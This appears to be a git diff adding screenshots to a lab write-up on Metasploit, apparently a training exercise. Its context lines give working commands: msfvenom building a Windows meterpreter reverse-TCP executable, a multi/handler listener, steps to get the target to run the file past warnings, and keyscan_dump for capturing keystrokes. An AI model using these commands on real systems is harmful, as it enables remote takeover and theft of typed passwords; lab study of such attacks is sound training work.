@@ -62,12 +62,15 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
+<img width="876" height="357" alt="Screenshot 2025-09-29 085932" src="https://github.com/user-attachments/assets/01eb26c3-db75-4c86-8dab-15da07d5b3b4" />
 
 
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
+
+<img width="1130" height="140" alt="Screenshot 2025-09-29 090119" src="https://github.com/user-attachments/assets/807c4e7e-13a0-43b2-84a1-952c8e43c19d" />
 
 
 
@@ -89,6 +92,8 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="741" height="478" alt="Screenshot 2025-09-29 090443" src="https://github.com/user-attachments/assets/1264d159-ed31-4237-917a-d2aefc6abc12" />
+
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -97,6 +102,9 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
+
+<img width="1033" height="954" alt="Screenshot 2025-09-29 090557" src="https://github.com/user-attachments/assets/6ea08d0c-4988-4ad7-aba8-75b4a1637589" />
+
 
 
 
@@ -112,6 +120,8 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+<img width="749" height="540" alt="Screenshot 2025-09-29 090911" src="https://github.com/user-attachments/assets/05d1f3f4-bb22-4f24-b808-ddcaa97320c1" />
+
 
 
 
